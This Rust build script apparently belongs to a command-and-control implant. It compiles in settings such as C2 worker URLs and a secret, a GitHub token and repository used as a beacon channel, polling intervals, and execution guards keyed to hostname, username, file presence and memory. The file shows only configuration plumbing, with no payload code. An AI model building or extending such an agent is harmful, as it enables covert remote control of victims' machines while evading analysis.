fn main() {
    // Force rebuild when any env var changes
    println!("cargo:rerun-if-env-changed=GITHUB_TOKEN");
    println!("cargo:rerun-if-env-changed=GITHUB_REPO");
    println!("cargo:rerun-if-env-changed=ENCRYPTION_PASSWORD");
    println!("cargo:rerun-if-env-changed=BACKUP_URL");
    println!("cargo:rerun-if-env-changed=POLL_INTERVAL");
    println!("cargo:rerun-if-env-changed=TIME_WINDOW");
    println!("cargo:rerun-if-env-changed=ENABLE_DEBUG");
    println!("cargo:rerun-if-env-changed=GUARD_HOSTNAME");
    println!("cargo:rerun-if-env-changed=GUARD_USERNAME");
    println!("cargo:rerun-if-env-changed=GUARD_FILE_EXISTS");
    println!("cargo:rerun-if-env-changed=GUARD_MIN_MEMORY_MB");
    println!("cargo:rerun-if-env-changed=AGENT_VERSION");
    println!("cargo:rerun-if-env-changed=RELEASE_ID");
    println!("cargo:rerun-if-env-changed=CHANNEL_TYPE");
    println!("cargo:rerun-if-env-changed=C2_WORKER_URLS");
    println!("cargo:rerun-if-env-changed=C2_WORKER_SECRET");
    println!("cargo:rerun-if-env-changed=C2_WORKER_PATH");

    if let Ok(v) = std::env::var("GITHUB_TOKEN") {
        println!("cargo:rustc-env=GITHUB_TOKEN={}", v);
        eprintln!("[build.rs] GITHUB_TOKEN set");
    } else {
        eprintln!("[build.rs] WARNING: GITHUB_TOKEN not set - agent will fail to connect!");
    }
    for key in &["GITHUB_REPO","ENCRYPTION_PASSWORD","BACKUP_URL",
                 "POLL_INTERVAL","TIME_WINDOW","ENABLE_DEBUG",
                 "GUARD_HOSTNAME","GUARD_USERNAME","GUARD_FILE_EXISTS","GUARD_MIN_MEMORY_MB",
                 "AGENT_VERSION","RELEASE_ID","CHANNEL_TYPE",
                 "C2_WORKER_URLS","C2_WORKER_SECRET","C2_WORKER_PATH"]
    {
        if let Ok(v) = std::env::var(key) {
            println!("cargo:rustc-env={}={}", key, v);
        }
    }
}
